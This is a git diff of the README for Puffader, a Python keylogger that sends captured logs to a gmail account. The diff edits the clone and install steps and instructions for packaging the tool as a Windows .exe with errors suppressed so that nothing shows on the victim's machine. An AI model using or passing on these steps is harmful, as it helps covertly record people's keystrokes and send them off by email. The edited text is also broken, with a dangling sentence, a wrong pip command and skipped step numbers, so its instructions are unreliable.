@@ -9,11 +9,12 @@ Puffader Requires:
 * [Pywin32](https://sourceforge.net/projects/pywin32/files/pywin32/)
 * [PyAutoGui](https://pypi.python.org/pypi/PyAutoGUI)
 
+1. Download the repository using github or git eg.```git clone https://github.com/xp4xbox/Puffader```
+2. Install the modules by running `python -m pip install requirements.txt`
+
 Please refer to the [wiki](https://github.com/xp4xbox/Puffader/wiki/Installing-Prerequisites) for more information on installing prerequisites.
 
-The program can be downloaded via github or git eg.
-```git clone https://github.com/xp4xbox/Puffader```
-
+The program can be downloaded via github or 
 ## Features
 Currently Puffader has several features such as:
 * Ability to send logs to any gmail account.
@@ -71,7 +72,6 @@ For more information please refer to the [wiki](https://github.com/xp4xbox/Puffa
 
 #### Py2Exe
 1. **(Optional)** Add this code to Puffader.py `sys.stderr = None` after the import statements to ensure no errors will show.
-2. Install [Py2Exe](https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/).
 3. Make sure the program is called Puffader.py in your python folder as well.
 4. Run `python setup.py`
 5. You should see the .exe in the dist folder.
